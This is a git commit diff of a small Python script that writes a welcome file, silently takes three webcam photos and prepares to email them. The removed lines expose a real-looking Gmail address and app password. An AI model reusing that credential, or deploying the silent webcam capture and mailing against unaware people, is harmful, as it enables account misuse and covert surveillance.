167320dd3734718372d51c9fc86ac2f0ad7fe496
MUSTAFA <mg7334mg@gmail.com>
2024-08-11 17:31:49 +0300

    python kodu iyilestirildi

--- send_email.py
+++ send_email.py
@@ -8,25 +8,27 @@ import os
 import subprocess
 import time
 
+# bu dosya yolu kismi istege bagli olup gondereceginiz maile aciklama ekleyecekseniz kullaniniz
 # Dosya yolu
-dosya_yolu = os.path.join(os.path.expanduser('~'), 'Desktop', 'welcome_mustafa.txt')
+dosya_yolu = os.path.join(os.path.expanduser('~'), 'Desktop', 'welcome_information.txt')
 
 # Desktop dizininin varlığını kontrol et ve yoksa oluştur
 os.makedirs(os.path.dirname(dosya_yolu), exist_ok=True)
 
 # Dosya oluşturma ve içine yazı ekleme
 with open(dosya_yolu, 'w') as dosya:
-    dosya.write('WELCOME MUSTAFA')
+    dosya.write('WELCOME owner')
 
 # Dosyayı açma (varsayılan metin düzenleyici ile)
 subprocess.run(['xdg-open', dosya_yolu])
 
-# Belirli bir kamera cihazını seçmek için cihaz numarasını değiştirin
-camera_device = 0  # Örneğin, ikinci kamera
+# kamera secimi
+camera_device = 0 
 
 # Kamerayı açma
 camera = cv2.VideoCapture(camera_device)
 
+# ard arda 3 fotograf cekme ve ilgili maile atma
 if not camera.isOpened():
     print(f"Kamera {camera_device} açılamadı.")
 else:
@@ -36,17 +38,17 @@ else:
         photo_path = os.path.join(os.path.expanduser('~'), f'Desktop/photo_{i+1}.png')
         cv2.imwrite(photo_path, image)
         photos.append(photo_path)
-        time.sleep(1)  # Bir sonraki fotoğrafı çekmeden önce 1 saniye bekleyin
+        time.sleep(1) 
 
     camera.release()
     cv2.destroyAllWindows()
 
 # Gönderen e-posta bilgileri
-fromaddr = "masterfasterkiller@gmail.com"
-password = "eprd afgv blwz ybfz"  # Uygulama şifresi
+fromaddr = "example@gmail.com"
+password = "ornek sifre"  # Uygulama şifresi
 
 # Alıcı e-posta bilgileri
-toaddr = "masterfasterkiller@gmail.com"
+toaddr = "exapmle@gmail.com"
 
 # E-posta mesajı oluşturma
 msg = MIMEMultipart()
